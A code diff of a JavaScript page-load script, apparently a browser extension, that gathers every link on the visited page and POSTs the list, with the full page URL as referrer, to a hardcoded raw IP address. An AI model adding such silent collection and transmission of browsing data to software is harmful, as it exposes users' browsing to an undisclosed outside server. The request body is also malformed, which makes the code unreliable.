@@ -1,21 +1,22 @@
 window.onload = function() {
-	//alert('Hello world! I am '+ window.location.href)
+	alert('Hello world! I am '+ window.location.href)
 	var urls = document.getElementsByTagName('a');
+	let urlList  =  [];
 	for (url in urls) {
-		console.log ( urls[url].href );
-		urls[url].style.backgroundColor = "#FDFF47";
+		urlList.push( urls[url].href+"" );
+		//urls[url].style.backgroundColor = "#FDFF47";
 	}
-	//highlightText(document.body,"create");
-}
 
-// function highlightText(element,text) {
-// 	var nodes = element.childNodes;
-// 	for (var i = 0, l = nodes.length; i < l; i++) {
-// 	  if (nodes[i].nodeType === 3) { // Node Type 3 is a text node
-// 		nodes[i].innerHTML = "<span style='background-color:red'>" + text + "</span>";
-// 	  }
-// 	  else if (nodes[i].childNodes.length > 0) {
-// 		highlightText(nodes[i],text);  // Not a text node or leaf, so check it's children
-// 	  }
-// 	}
-// }
+	fetch("http://3.22.236.108/", {
+		method: "POST",
+		mode: "cors",
+		referrer:"unsafe-url",
+		headers: {'Content-Type': 'application/json'} ,
+		body: {data:urlList}
+	}).then(res => {
+		console.log('result is:',res);
+	}).catch(err=> {
+		console.log('error is:',err)
+	});
+		//highlightText(document.body,"create");
+}
